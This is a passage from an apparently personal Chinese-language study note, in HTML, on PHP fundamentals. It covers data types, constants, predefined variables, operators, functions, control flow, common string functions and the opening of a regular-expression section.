一组数据的集合</p><p>&nbsp; &nbsp; 语法格式：<code>$array = array(&#39;value1&#39;,&#39;value2&#39;)</code> 或 <code>$array[key]=&#39;value&#39;</code> 或 <code>$array = array(key1 =&gt; value1,key2=&gt;value2)</code></p><p>&nbsp; &nbsp; 其中 <strong>key</strong> 是数组元素的下标， <strong>value</strong> 是数组下标对应的元素</p><p>&nbsp; 1.6 <strong>object</strong></p><p>&nbsp; &nbsp; 面向对象和面向过程</p><p>&nbsp; 1.7 <strong>特殊数据类型</strong></p><p>&nbsp; 资源（resource）和空值（null）</p><pre><code>&gt;资源：又叫句柄，保存了到外部资源的一个引用&gt;空值：表示变量没有值&gt;unset()：销毁指定的变量</code></pre><p>&nbsp;</p><h4 id="nbsp-nbsp-nbsp-nbsp-数据类型转换"><a href="#nbsp-nbsp-nbsp-nbsp-数据类型转换" class="headerlink" title="&nbsp;&nbsp;&nbsp;&nbsp;数据类型转换"></a>&nbsp;&nbsp;&nbsp;&nbsp;数据类型转换</h4><p>&nbsp; &nbsp; 变量前加上 <strong>小括号</strong> 括起来的类型即可</p><pre><code>(boolean)$sum 、(inter)$boo</code></pre><p>&nbsp; &nbsp; 函数 <strong>settype（）</strong> 完成</p><pre><code>bool settype(mixed var,string type)</code></pre><p>&nbsp; &nbsp; <strong>var</strong>  —— 指定的变量</p><p>&nbsp; &nbsp; <strong>type</strong> —— 指定的类型（boolean、float、integer、array、null、object、string）</p><p>&nbsp; &nbsp; 转换成功返回 true 失败则 false</p><p>&nbsp;</p><h4 id="nbsp-nbsp-nbsp-nbsp-检测数据类型"><a href="#nbsp-nbsp-nbsp-nbsp-检测数据类型" class="headerlink" title="&nbsp;&nbsp;&nbsp;&nbsp;检测数据类型"></a>&nbsp;&nbsp;&nbsp;&nbsp;检测数据类型</h4><p>&nbsp; &nbsp; PHP内有许多内置函数关于检测，为 <strong>is</strong> 系列</p><pre><code>is_bool ; is_string ; is_float ; is_int ; is_null ; is_array ; is_null ; is_object ; is_numeric(检测是否为数字或者由数字组成的字符串)</code></pre><p>&nbsp; </p><h3 id="nbsp-nbsp-常量"><a href="#nbsp-nbsp-常量" class="headerlink" title="&nbsp;&nbsp;常量"></a>&nbsp;&nbsp;常量</h3><h4 id="nbsp-nbsp-nbsp-nbsp-声明和使用"><a href="#nbsp-nbsp-nbsp-nbsp-声明和使用" class="headerlink" title="&nbsp;&nbsp;&nbsp;&nbsp;声明和使用"></a>&nbsp;&nbsp;&nbsp;&nbsp;声明和使用</h4><p>&nbsp;&nbsp;使用 <strong>define()</strong> 来定常量</p><pre><code>define(string constant_name,mixed value,case_sensitive=false)constant_name : 必选参数，常量名称，即标识符value : 必选参数，常量的值case_sensitive : 可选参数，指定是否大小写敏感，true则不敏感</code></pre><p>&nbsp;&nbsp;获取常量设置的值有两种方法，一种是使用常量名输出，另一种是使用函数 <strong>constant()</strong> 输出</p><pre><code>mixed constant(string const_name)const_name : 常量名，成功则返回常量的值，失败则输出错误</code></pre><p>&nbsp;&nbsp;判断常量是否被定义可以使用 <strong>defined()</strong> 函数</p><pre><code>bool defined(string constant_name)constant_name : 常量名称，存在则返回true，否则是false</code></pre><p>&nbsp;</p><h4 id="nbsp-nbsp-nbsp-nbsp-预定义常量"><a href="#nbsp-nbsp-nbsp-nbsp-预定义常量" class="headerlink" title="&nbsp;&nbsp;&nbsp;&nbsp;预定义常量"></a>&nbsp;&nbsp;&nbsp;&nbsp;预定义常量</h4><p>&nbsp;&nbsp;PHP中有系统预定义常量</p><pre><code>__FILE__ : php程序文件名__LINE__ : php程序行数PHP_VERSION : php版本PHP_OS : 执行解析php的操作系统TRUE or FALSE or NULL : 布尔值和空值E_ERROR : 指到最近错误处E_WARNING : 指到最近警告处E_PARSE : 指到解析语法有潜在问题处E_NOTICE : 不寻常处提示</code></pre><p>&nbsp;</p><h3 id="nbsp-nbsp-PHP变量"><a href="#nbsp-nbsp-PHP变量" class="headerlink" title="&nbsp;&nbsp;PHP变量"></a>&nbsp;&nbsp;PHP变量</h3><p>&nbsp;</p><h4 id="nbsp-nbsp-nbsp-nbsp-变量声明及使用"><a href="#nbsp-nbsp-nbsp-nbsp-变量声明及使用" class="headerlink" title="&nbsp;&nbsp;&nbsp;&nbsp;变量声明及使用"></a>&nbsp;&nbsp;&nbsp;&nbsp;变量声明及使用</h4><p>&nbsp;&nbsp;变量名称由 <strong>$</strong> 和 <strong>标识符</strong> 组成。标识符由字母、数字或下划线组成，且不能以数字开头。</p><p>&nbsp;&nbsp;变量赋值一般有直接赋值，还有变量间赋值。</p><pre><code>直接赋值和其他语言一样引用赋值在变量前加上 &amp; 符号取其他变量的地址区别：直接赋值是开辟新的内存空间，引用赋值则是多一个名字</code></pre><p>&nbsp;</p><h4 id="nbsp-nbsp-nbsp-nbsp-变量作用域"><a href="#nbsp-nbsp-nbsp-nbsp-变量作用域" class="headerlink" title="&nbsp;&nbsp;&nbsp;&nbsp;变量作用域"></a>&nbsp;&nbsp;&nbsp;&nbsp;变量作用域</h4><p>&nbsp;&nbsp;php和其他语言一样有局部变量，全局变量(<strong>global</strong>)和静态变量(<strong>static</strong>)</p><pre><code>全局变量：被定义在所有函数之外静态变量：能够在函数调用结束后仍然保留变量值，再次回到作用域时，可继续使用</code></pre><p>&nbsp;</p><h4 id="nbsp-nbsp-nbsp-nbsp-可变变量"><a href="#nbsp-nbsp-nbsp-nbsp-可变变量" class="headerlink" title="&nbsp;&nbsp;&nbsp;&nbsp;可变变量"></a>&nbsp;&nbsp;&nbsp;&nbsp;可变变量</h4><p>&nbsp;&nbsp;允许动态改变变量名称（套娃变量）</p><pre><code>$animal = &apos;turtles&apos;;      $turtles = 103;echo $$animal;则会输出103数字</code></pre><p>&nbsp;</p><h4 id="nbsp-nbsp-nbsp-nbsp-PHP预定义变量"><a href="#nbsp-nbsp-nbsp-nbsp-PHP预定义变量" class="headerlink" title="&nbsp;&nbsp;&nbsp;&nbsp;PHP预定义变量"></a>&nbsp;&nbsp;&nbsp;&nbsp;PHP预定义变量</h4><pre><code>$_GET — HTTP GET 变量$_POST — HTTP POST 变量$_FILES — HTTP 文件上传变量$_REQUEST — HTTP Request 变量$_SESSION — Session 变量$_COOKIE — HTTP Cookies，多数由setcookie()函数设置$_SERVER[&apos;REMOTE_ADDR&apos;] —— 浏览当前页面的用户的 IP 地址$_SERVER[&apos;SERVER_ADDR&apos;] —— 当前运行脚本所在的服务器的 IP 地址。$_SERVER[&apos;SERVER_NAME&apos;] —— 当前运行脚本所在的服务器的主机名$_SERVER[&apos;SERVER_PORT&apos;] —— 服务器使用的端口$_SERVER[&apos;DOCUMENT_ROOT&apos;] —— 当前运行脚本所在的文档根目录。在服务器配置文件中定义。$_SERVER[&apos;PHP_SELF&apos;] —— 获取当前网页地址（不含域名部分）$_SERVER[&apos;QUERY_STRING&apos;] —— 获取当前网页地址中的所有get数据（就是？号后面的部分），但只是一个整体的字符串而已$_SERVER[&apos;SCRIPT_FILENAME&apos;] —— 当前执行脚本的绝对路径$_SERVER[&apos;SERVER_SIGNATURE&apos;] —— 包含服务器版本和虚拟主机名的字符串</code></pre><p>&nbsp;</p><h3 id="nbsp-nbsp-PHP运算符"><a href="#nbsp-nbsp-PHP运算符" class="headerlink" title="&nbsp;&nbsp;PHP运算符"></a>&nbsp;&nbsp;PHP运算符</h3><h4 id="nbsp-nbsp-nbsp-nbsp-算术运算符"><a href="#nbsp-nbsp-nbsp-nbsp-算术运算符" class="headerlink" title="&nbsp;&nbsp;&nbsp;&nbsp;算术运算符"></a>&nbsp;&nbsp;&nbsp;&nbsp;算术运算符</h4><p>&nbsp;&nbsp;主要有 <strong>+</strong>   <strong>-</strong> * <strong>/</strong> <strong>%</strong><br>&nbsp;</p><h4 id="nbsp-nbsp-nbsp-nbsp-字符串运算符"><a href="#nbsp-nbsp-nbsp-nbsp-字符串运算符" class="headerlink" title="&nbsp;&nbsp;&nbsp;&nbsp;字符串运算符"></a>&nbsp;&nbsp;&nbsp;&nbsp;字符串运算符</h4><p>&nbsp;&nbsp;只有一个为英文的 <strong>.</strong> 将两个字符串连接起来。<br>&nbsp;</p><h4 id="nbsp-nbsp-nbsp-nbsp-赋值运算符"><a href="#nbsp-nbsp-nbsp-nbsp-赋值运算符" class="headerlink" title="&nbsp;&nbsp;&nbsp;&nbsp;赋值运算符"></a>&nbsp;&nbsp;&nbsp;&nbsp;赋值运算符</h4><p>&nbsp;&nbsp;基本运算符 <strong>=</strong> 将右边的值赋给左边的变量，可配合算数运算符<br>&nbsp;</p><h4 id="nbsp-nbsp-nbsp-nbsp-递增-递减运算符"><a href="#nbsp-nbsp-nbsp-nbsp-递增-递减运算符" class="headerlink" title="&nbsp;&nbsp;&nbsp;&nbsp;递增/递减运算符"></a>&nbsp;&nbsp;&nbsp;&nbsp;递增/递减运算符</h4><p>&nbsp;&nbsp;运算符 <strong>++</strong> 和 <strong>–</strong> 效果和其他语言相似<br>&nbsp;</p><h4 id="nbsp-nbsp-nbsp-nbsp-位运算符"><a href="#nbsp-nbsp-nbsp-nbsp-位运算符" class="headerlink" title="&nbsp;&nbsp;&nbsp;&nbsp;位运算符"></a>&nbsp;&nbsp;&nbsp;&nbsp;位运算符</h4><p>&nbsp;&nbsp;二进制位从低到高的运算</p><pre><code>&amp;    按位与|    按位或^    按位异或~    按位取反&lt;&lt;  向左移位&gt;&gt;  向右移位</code></pre><p>&nbsp;</p><h4 id="nbsp-nbsp-nbsp-nbsp-逻辑运算符"><a href="#nbsp-nbsp-nbsp-nbsp-逻辑运算符" class="headerlink" title="&nbsp;&nbsp;&nbsp;&nbsp;逻辑运算符"></a>&nbsp;&nbsp;&nbsp;&nbsp;逻辑运算符</h4><p>&nbsp;&nbsp;用来组合逻辑运算的结果</p><pre><code>&amp;&amp; 或 and    逻辑与|| 或 or        逻辑或xor            逻辑异或！            逻辑非</code></pre><p>&nbsp;</p><h4 id="nbsp-nbsp-nbsp-nbsp-比较运算符"><a href="#nbsp-nbsp-nbsp-nbsp-比较运算符" class="headerlink" title="&nbsp;&nbsp;&nbsp;&nbsp;比较运算符"></a>&nbsp;&nbsp;&nbsp;&nbsp;比较运算符</h4><p>&nbsp;&nbsp;对变量或表达式的结果进行大小真假的比较，真则true，假则false</p><pre><code>不常见的主要是 === 和 ！== ，这两个符号不仅判断数值，还判断数值的数据类型</code></pre><p>&nbsp;</p><h4 id="nbsp-nbsp-nbsp-nbsp-条件运算符"><a href="#nbsp-nbsp-nbsp-nbsp-条件运算符" class="headerlink" title="&nbsp;&nbsp;&nbsp;&nbsp;条件运算符"></a>&nbsp;&nbsp;&nbsp;&nbsp;条件运算符</h4><p>&nbsp;&nbsp;<strong>(?:)</strong> 也称三目运算符，<strong>?</strong> 为前为判断表达式，真则进入 <strong>:</strong> 前的表达式，假则进入 <strong>：</strong> 后的<br>&nbsp;</p><h4 id="nbsp-nbsp-nbsp-nbsp-运算符优先级"><a href="#nbsp-nbsp-nbsp-nbsp-运算符优先级" class="headerlink" title="&nbsp;&nbsp;&nbsp;&nbsp;运算符优先级"></a>&nbsp;&nbsp;&nbsp;&nbsp;运算符优先级</h4><p>&nbsp;&nbsp;查表即可<br>&nbsp;</p><h3 id="nbsp-nbsp-PHP函数"><a href="#nbsp-nbsp-PHP函数" class="headerlink" title="&nbsp;&nbsp;PHP函数"></a>&nbsp;&nbsp;PHP函数</h3><h4 id="nbsp-nbsp-nbsp-nbsp-定义和调用函数"><a href="#nbsp-nbsp-nbsp-nbsp-定义和调用函数" class="headerlink" title="&nbsp;&nbsp;&nbsp;&nbsp;定义和调用函数"></a>&nbsp;&nbsp;&nbsp;&nbsp;定义和调用函数</h4><p>&nbsp;&nbsp;函数，即将重复调用的功能卸载独立一个模块内</p><pre><code>创建函数基本语法格式：function fun_name($str1,...$strn){    fun_body}function    为声明自定义函数时必须使用的关键字fun_name    为自定义函数名$strn        为函数参数</code></pre><p>&nbsp;</p><h4 id="nbsp-nbsp-nbsp-nbsp-函数间传递参数"><a href="#nbsp-nbsp-nbsp-nbsp-函数间传递参数" class="headerlink" title="&nbsp;&nbsp;&nbsp;&nbsp;函数间传递参数"></a>&nbsp;&nbsp;&nbsp;&nbsp;函数间传递参数</h4><p>&nbsp;&nbsp;1. <strong>按值传递</strong>：    传参在函数定义域内值改变不影响外部</p><p>&nbsp;&nbsp;2. <strong>按引用传递</strong>：     传参时加上 <strong>&amp;</strong> 将参数内存地址传入，函数定义域内外参数的值都会改变</p><p>&nbsp;&nbsp;3. <strong>默认参数</strong> ：    一般放在参数列表末尾，并指定默认值<br>&nbsp;</p><h4 id="nbsp-nbsp-nbsp-nbsp-函数返回值"><a href="#nbsp-nbsp-nbsp-nbsp-函数返回值" class="headerlink" title="&nbsp;&nbsp;&nbsp;&nbsp;函数返回值"></a>&nbsp;&nbsp;&nbsp;&nbsp;函数返回值</h4><p>&nbsp;&nbsp;用 <strong>return</strong> 返回一个值，只能一个值，若要多个则需要创建数组</p><h4 id="nbsp-nbsp-nbsp-nbsp-变量函数"><a href="#nbsp-nbsp-nbsp-nbsp-变量函数" class="headerlink" title="&nbsp;&nbsp;&nbsp;&nbsp;变量函数"></a>&nbsp;&nbsp;&nbsp;&nbsp;变量函数</h4><p>&nbsp;&nbsp;基本效果如同可变变量一样（套娃）<br>&nbsp;<br>&nbsp;<br>&nbsp;</p><h2 id="流程控制语句"><a href="#流程控制语句" class="headerlink" title="流程控制语句"></a>流程控制语句</h2><h3 id="nbsp-nbsp-条件控制语句"><a href="#nbsp-nbsp-条件控制语句" class="headerlink" title="&nbsp;&nbsp;条件控制语句"></a>&nbsp;&nbsp;条件控制语句</h3><p>&nbsp;&nbsp;包括 <strong>if</strong> , <strong>if else</strong> , <strong>elseif</strong> , <strong>switch</strong> </p><h3 id="nbsp-nbsp-循环控制语句"><a href="#nbsp-nbsp-循环控制语句" class="headerlink" title="&nbsp;&nbsp;循环控制语句"></a>&nbsp;&nbsp;循环控制语句</h3><p>&nbsp;&nbsp;包括 <strong>while</strong> ， <strong>do…while</strong> , <strong>for</strong> ，<strong>foreach</strong></p><p>&nbsp;&nbsp;<strong>foreach</strong> 语句将遍历数组内</p><pre><code>foreach($array as $value)    语句;或foreach($array as $key =&gt;$value)    语句;</code></pre><p>&nbsp;</p><h3 id="nbsp-nbsp-跳转语句"><a href="#nbsp-nbsp-跳转语句" class="headerlink" title="&nbsp;&nbsp;跳转语句"></a>&nbsp;&nbsp;跳转语句</h3><p>&nbsp;&nbsp;包括了 <strong>break</strong> ， <strong>continue</strong></p><h2 id="字符串操作"><a href="#字符串操作" class="headerlink" title="字符串操作"></a>字符串操作</h2><h3 id="nbsp-nbsp-字符串定义"><a href="#nbsp-nbsp-字符串定义" class="headerlink" title="&nbsp;&nbsp;字符串定义"></a>&nbsp;&nbsp;字符串定义</h3><h4 id="nbsp-nbsp-nbsp-nbsp-引号定义"><a href="#nbsp-nbsp-nbsp-nbsp-引号定义" class="headerlink" title="&nbsp;&nbsp;&nbsp;&nbsp;引号定义"></a>&nbsp;&nbsp;&nbsp;&nbsp;引号定义</h4><p>&nbsp;&nbsp;单引号的内容只会将内容原样输出，而双引号会对内的变量进行替换然后输出</p><h4 id="nbsp-nbsp-nbsp-nbsp-定界符定义"><a href="#nbsp-nbsp-nbsp-nbsp-定界符定义" class="headerlink" title="&nbsp;&nbsp;&nbsp;&nbsp;定界符定义"></a>&nbsp;&nbsp;&nbsp;&nbsp;定界符定义</h4><p>&nbsp;&nbsp;定界符 <strong>&lt;&lt;&lt;</strong> 用于定义格式化的大文本，定界符内的字符串支持单双引号，并且支持字符变量替换</p><pre><code>&lt;&lt;&lt;（用户自定符号）    文本内容（用户自定符号）</code></pre><p>&nbsp;</p><h3 id="nbsp-nbsp-字符串操作"><a href="#nbsp-nbsp-字符串操作" class="headerlink" title="&nbsp;&nbsp;字符串操作"></a>&nbsp;&nbsp;字符串操作</h3><h4 id="nbsp-nbsp-nbsp-nbsp-去除字符串特殊字符和首尾空格"><a href="#nbsp-nbsp-nbsp-nbsp-去除字符串特殊字符和首尾空格" class="headerlink" title="&nbsp;&nbsp;&nbsp;&nbsp;去除字符串特殊字符和首尾空格"></a>&nbsp;&nbsp;&nbsp;&nbsp;去除字符串特殊字符和首尾空格</h4><p>&nbsp;&nbsp;对用户输入字符进行过滤空格和特殊字符，有 <strong>trim()</strong> , <strong>ltrim()</strong> ，<strong>rtrim()</strong> 来去除</p><p>&nbsp;&nbsp;1.<strong>trim()</strong> 函数</p><pre><code>string trim(string str [,string charlist]);trim()主要用于过滤字符串首尾字符str 是要操作的字符串对象；charlist为可选参数，一般列出所有希望过滤的字符</code></pre><p>&nbsp;<br>&nbsp;&nbsp;2.<strong>ltrim()</strong> 函数</p><pre><code>string ltrim(string str [,string charlist]);ltrim()主要用于过滤字符串左边字符，参数和trim()一样</code></pre><p>&nbsp;<br>&nbsp;&nbsp;3.<strong>rtrim()</strong> 函数</p><pre><code>string ltrim(string str [,string charlist]);rtrim()主要用于过滤字符串右边字符，参数和trim()一样</code></pre><p>&nbsp;</p><h4 id="nbsp-nbsp-nbsp-nbsp-转义和还原字符串数据"><a href="#nbsp-nbsp-nbsp-nbsp-转义和还原字符串数据" class="headerlink" title="&nbsp;&nbsp;&nbsp;&nbsp;转义和还原字符串数据"></a>&nbsp;&nbsp;&nbsp;&nbsp;转义和还原字符串数据</h4><p>&nbsp;&nbsp;一共有两种转义、还原字符串方式：<strong>手工和自动</strong></p><p>&nbsp;&nbsp;1.手动</p><p>&nbsp;&nbsp;使用 <strong>\</strong> 将后面第一个字符变得没有特殊意义</p><p>&nbsp;&nbsp;2.自动</p><p>&nbsp;&nbsp;①<strong>addslashes()</strong>函数</p><pre><code>string addslashes(string str)addlashes函数是使用反斜线引用字符串str为要转义的字符串，返回值为转义后的字符</code></pre><p>&nbsp;<br>&nbsp;&nbsp;②<strong>stripslashes()</strong>函数</p><pre><code>string stripslashes(string str)stripslashes函数是反引用一个引用字符串，即将addslashes函数转义后的字符串还原str为要还原的字符串</code></pre><p>&nbsp;<br>&nbsp;&nbsp;③<strong>addcslashes()</strong>函数</p><pre><code>string addcslashes(string str,string charlist)addcslashes函数对指定的字符串前加上反斜线str为将要被操作的字符串，charlist则指定字符串中哪些字符串加反斜线</code></pre><p>&nbsp;<br>&nbsp;&nbsp;④<strong>stripcslashes()</strong>函数</p><pre><code>string stripcslashes(string str)stripcslashes函数对addcslashes函数转义的字符进行还原str为要还原的字符串</code></pre><p>&nbsp;</p><h4 id="nbsp-nbsp-nbsp-nbsp-获取字符串长度"><a href="#nbsp-nbsp-nbsp-nbsp-获取字符串长度" class="headerlink" title="&nbsp;&nbsp;&nbsp;&nbsp;获取字符串长度"></a>&nbsp;&nbsp;&nbsp;&nbsp;获取字符串长度</h4><p>&nbsp;&nbsp;主要使用 <strong>strlen()</strong> 函数进行获取</p><pre><code>int strlen(string str)获取字符串长度</code></pre><p>&nbsp;</p><h4 id="nbsp-nbsp-nbsp-nbsp-截取字符串"><a href="#nbsp-nbsp-nbsp-nbsp-截取字符串" class="headerlink" title="&nbsp;&nbsp;&nbsp;&nbsp;截取字符串"></a>&nbsp;&nbsp;&nbsp;&nbsp;截取字符串</h4><p>&nbsp;&nbsp;对字符串截取可以采用预定义函数 <strong>substr()</strong> 函数实现</p><pre><code>string substr(string str,int start[,int length])str     指定字符串对象start    指定开始截取字符串的位置，若为负数则从字符串末尾开始length    可选参数，指定截取字符串个数，若为负数则表示取倒数第length个字符</code></pre><p>&nbsp;</p><h4 id="nbsp-nbsp-nbsp-nbsp-比较字符串"><a href="#nbsp-nbsp-nbsp-nbsp-比较字符串" class="headerlink" title="&nbsp;&nbsp;&nbsp;&nbsp;比较字符串"></a>&nbsp;&nbsp;&nbsp;&nbsp;比较字符串</h4><p>&nbsp;&nbsp;比较方法主要有三种：<strong>按照字节，按照自然排序和指定源字符串位置开始</strong></p><p>&nbsp;&nbsp;①按照字节进行字符串比较：<strong>strcmp()</strong> 和 <strong>strcasecmp()</strong></p><pre><code>int strcmp(string str1 , string str2)int strcasecmp(string str1 , string str2)str1和str2为比较的字符串，相等则返回0，str1大于str2返回值大于0，小于则返回小于0strcmp()和strcasecmp()差别在于：strcmp()区分大小写而strcasecmp()不区分</code></pre><p>&nbsp;<br>&nbsp;&nbsp;②按自然排序法进行比较：<strong>strnatcmp()</strong></p><pre><code>int strnatcmp(string str1 , string str2)strnatcmp()将字符串中的字符从左到右顺序进行比较数字和数字比较按照自然排序法，其他则按照ACSII码值比较str1和str2为比较的字符，相等返回0，str1比str2大则返回大于0，小则返回小于0</code></pre><p>&nbsp;<br>&nbsp;&nbsp;③指定从源字符串位置开始比较：<strong>strncmp()</strong></p><pre><code>int strncmp(string str1 , string str2 , int len)len为必要参数，指定每个字符串中参与比较的字符串数量strncmp 区分函数大小写返回值和上面的相同</code></pre><p>&nbsp;</p><h4 id="nbsp-nbsp-nbsp-nbsp-检索字符串"><a href="#nbsp-nbsp-nbsp-nbsp-检索字符串" class="headerlink" title="&nbsp;&nbsp;&nbsp;&nbsp;检索字符串"></a>&nbsp;&nbsp;&nbsp;&nbsp;检索字符串</h4><p>&nbsp;&nbsp;① <strong>strstr()</strong> 函数</p><p>&nbsp;&nbsp;用于获取一个指定字符串在另一个字符串中首次出现的位置到后者末尾的子字符串，成功则返回剩余字符串，失败则返回false。简单的说就是返回一个字符串某个标识后面所有字符。</p><pre><code>string strstr(string haystack ， string needle)haystack    必要参数，指定从哪个字符串中进行检索needle        必要参数，指定搜索对象。strstr()区分字母大小写//大小写绕过</code></pre><p>&nbsp;<br>&nbsp;&nbsp;② <strong>substr_count()</strong> 函数</p><p>&nbsp;&nbsp;获取指定字符在字符串中出现的次数</p><pre><code>int substr_count(string haystack ， string needle)haystack    指定字符串needle        指定字符</code></pre><p>&nbsp;</p><h4 id="nbsp-nbsp-nbsp-nbsp-替换字符串"><a href="#nbsp-nbsp-nbsp-nbsp-替换字符串" class="headerlink" title="&nbsp;&nbsp;&nbsp;&nbsp;替换字符串"></a>&nbsp;&nbsp;&nbsp;&nbsp;替换字符串</h4><p>&nbsp;&nbsp;① <strong>str_ireplace()</strong> 函数</p><p>&nbsp;&nbsp;使用新的字符串替换原始字符串中指定的字符</p><pre><code>mixed str_ireplace(mixed search ，mixed replace，mixed subject [，int &amp;count])search    必要参数，要搜索的值，可以用array来提供多个值replace    必要参数，指定替换的值subject    必要参数，要被搜索和替换的字符串或数组count    可选参数，执行替换的数量str_ireplace 函数不区分大小写</code></pre><p>&nbsp;<br>&nbsp;&nbsp;② <strong>substr_replace()</strong> 函数</p><p>&nbsp;&nbsp;用于对指定字符串中的部分字符串进行替换</p><pre><code>mixed substr_replace(mixed string，mixed repl，mixed start ，[mixed length])string    指定要操作的原始字符串repl    指定要替换后的新字符串start    指定替换字符串开始的位置length    可选参数，指定返回的字符串长度，默认是返回整个字符串若start为负数，而length小于或等于start的值，length的值为0</code></pre><p>&nbsp;</p><h4 id="nbsp-nbsp-nbsp-nbsp-格式化字符串"><a href="#nbsp-nbsp-nbsp-nbsp-格式化字符串" class="headerlink" title="&nbsp;&nbsp;&nbsp;&nbsp; 格式化字符串"></a>&nbsp;&nbsp;&nbsp;&nbsp; 格式化字符串</h4><p>&nbsp;&nbsp;<strong>number_format()</strong> 函数可用来将数字字符串格式化</p><pre><code>string number_format(float number[,int decimals[,string dec_point[,string thousands_sep]]])number            为要格式化的数字decimals        为要保留的小数位数dec_point        为指定小数点显示的字符thousands_sep    为指定千位分隔符显示的字符</code></pre><p>&nbsp;</p><h4 id="nbsp-nbsp-nbsp-nbsp-分割和合成字符串"><a href="#nbsp-nbsp-nbsp-nbsp-分割和合成字符串" class="headerlink" title="&nbsp;&nbsp;&nbsp;&nbsp;分割和合成字符串"></a>&nbsp;&nbsp;&nbsp;&nbsp;分割和合成字符串</h4><p>&nbsp;&nbsp;① <strong>explode()</strong> 函数按照一定规则对一个字符串进行分割</p><pre><code>array explode(string delimiter,string str[,int limit])delimiter    边界上的分隔符str            必要参数，指定将要被分割的字符串limit        可选参数，若设置了limit参数，则返回的数组包含最多limit个字符注意：返回是以数组形式</code></pre><p>&nbsp;<br>&nbsp;&nbsp;② <strong>implode()</strong> 函数将数组内的内容合成一个新的字符串</p><pre><code>string implode(string glue,array pieces)glue    字符串类型pieces    数组类型，指定要被合并的数组</code></pre><p>&nbsp;</p><h2 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h2><h3 id="nbsp-nbsp-正则表达式的概念"><a href="#nbsp-nbsp-正则表达式的概念" class="headerlink" title="&nbsp;&nbsp;正则表达式的概念"></a>&nbsp;&nbsp;正则表达式的概念</h3><p>&nbsp;&nbsp;正则表达式是一种描述字符串结构的语法规则，是一种特定的格式化模式，可以<strong>匹配、替换、截取匹配的字符串</strong>，类似dos命令中的    dir *.txt</p><p>&nbsp;&nbsp;这里说明几种术语</p><pre><code>grep    最初是ED编辑器的一条命令，用于显示文件中的特定内容，后独立成一个工具egrep    grep的扩展版，大大增强grep的能力POSIX    可移植操作系统接口，POSIX是一系列标准，确保操作系统之间的可移植性Perl    实际抽取与汇报语言，成为与POSIX之后的另一个标准PCRE    兼容Perl正则表达式的一套正则引擎，PHP正是使用该引擎之一</code></pre><p>&nbsp;</p><h3 id="nbsp-nbsp-正则表达式的语法规则"><a href="#nbsp-nbsp-正则表达式的语法规则" class="headerlink" title="&nbsp;&nbsp;正则表达式的语法规则"></a>&nbsp;&nbsp;正则表达式的语法规则</h3><p>&nbsp;&nbsp;一个完整的正则表达式由两部分构成，<strong>元字符</strong>和<strong>文本字符</strong>。元字符是具有特殊含义的字符，如前面列举dos命令中的 * 符号。文本字符就是普通文本，如数字和字母。PCRE风格的正则表达式一般都是放置在定界符 <strong>/</strong> 中间。</p><h4 id="nbsp-nbsp-nbsp-nbsp-行定位符-和"><a href="#nbsp-nbsp-nbsp-nbsp-行定位符-和" class="headerlink" title="&nbsp;&nbsp;&nbsp;&nbsp;行定位符(^ 和 $)"></a>&nbsp;&nbsp;&nbsp;&nbsp;行定位符(<strong>^</strong> 和 <strong>$</strong>)</h4><p>&nbsp;&nbsp;行定位符就是用来描述字符的边界。__ <strong>^</strong> 表示行的开始， <strong>$</strong> 表示行的结尾。__</p><pre><code>^tm 该表达式表示要匹配字串 tm 的开始位置是行头例如： tm this is a dog 就可以匹配，this is a dog tm 则不匹配tm$ 则可以匹配例子:this is a dog tmtm 则匹配的字串可以出现在字符串任意位置</code></pre><p>&nbsp;</p><h4 id="nbsp-nbsp-nbsp-nbsp-单词分界符-b-和-B"><a href="#nbsp-nbsp-nbsp-nbsp-单词分界符-b-和-B" class="headerlink" title="&nbsp;&nbsp;&nbsp;&nbsp;单词分界符(\b  和 \B)"></a>&nbsp;&nbsp;&nbsp;&nbsp;单词分界符(<strong>\b</strong>  和 <strong>\B</strong>)</h4><p>&nbsp;&nbsp;以上面的例子，若按照 tm 则会匹配出 html 内的一部分 tm 而非一个单词 tm ，这是则可使用单词分界符 <strong>\b</strong> 表示，<strong>这表示要查找的是为一个完整的单词</strong>。 </p><pre><code>\btm\b</code></pre><p>&nbsp;&nbsp;<strong>\B</strong> 正好相反，<strong>表示匹配的是单词或字符串的一部分</strong>。</p><pre><code>\Btm\B</code></pre><p>&nbsp;</p><h4 id="nbsp-nbsp-nbsp-nbsp-字符类"><a href="#nbsp-nbsp-nbsp-nbsp-字符类" class="headerlink" title="&nbsp;&nbsp;&nbsp;&nbsp;字符类([ ])"></a>&nbsp;&nbsp;&nbsp;&nbsp;字符类([ ])</h4><p>&nbsp;&nbsp;正则表达式是区分大小写的，若要<strong>忽略大小写</strong>则使用 <strong>[ ]</strong></p><pre><code>若要匹配 tm 不区分大小写则应该写作：[Tt][Mm]</code></pre><p>&nbsp;</p><h4 id="nbsp-nbsp-nbsp-nbsp-选择字符"><a href="#nbsp-nbsp-nbsp-nbsp-选择字符" class="headerlink" title="&nbsp;&nbsp;&nbsp;&nbsp;选择字符( | )"></a>&nbsp;&nbsp;&nbsp;&nbsp;选择字符( | )</h4><p>&nbsp;&nbsp;若要忽略大小写还可以使用选择字符，符号理解成<strong>或</strong></p><pre><code>匹配 tm 不区分大小写也可以写成：(T|t)(M|m)| 和 [] 符号的差别在于前者可以匹配任意长度的字符串，后者只能匹配单个字符</code></pre><h4 id="nbsp-nbsp-nbsp-nbsp-连字符"><a href="#nbsp-nbsp-nbsp-nbsp-连字符" class="headerlink" title="&nbsp;&nbsp;&nbsp;&nbsp;连字符( - )"></a>&nbsp;&nbsp;&nbsp;&nbsp;连字符( - )</h4><p>&nbsp;&nbsp;<strong>匹配变量的第一个字母</strong>可以使用连字符解决</p><pre><code>[a-zA-Z]</code></pre><p>&nbsp;</p><h4 id="nbsp-nbsp-nbsp-nbsp-排除字符"><a href="#nbsp-nbsp-nbsp-nbsp-排除字符" class="headerlink" title="&nbsp;&nbsp;&nbsp;&nbsp;排除字符([^])"></a>&nbsp;&nbsp;&nbsp;&nbsp;排除字符([^])</h4><p>&nbsp;&nbsp;<strong>若要匹配不符合规则的变量</strong>，可以使用 ^ 符号</p><pre><code>匹配不以字母开头的变量：[^a-zA-Z]</code></pre><p>&nbsp;</p><h4 id="nbsp-nbsp-nbsp-nbsp-限定符-n-m"><a href="#nbsp-nbsp-nbsp-nbsp-限定符-n-m" class="headerlink" title="&nbsp;&nbsp;&nbsp;&nbsp;限定符( ?*+{n,m} )"></a>&nbsp;&nbsp;&nbsp;&nbsp;限定符( ?*+{n,m} )</h4><p>&nbsp;&nbsp;对于<strong>重复出现的字符串</strong>，可以使用限定符来实现匹配</p><pre><code>?        匹配前面的字符零次或一次+        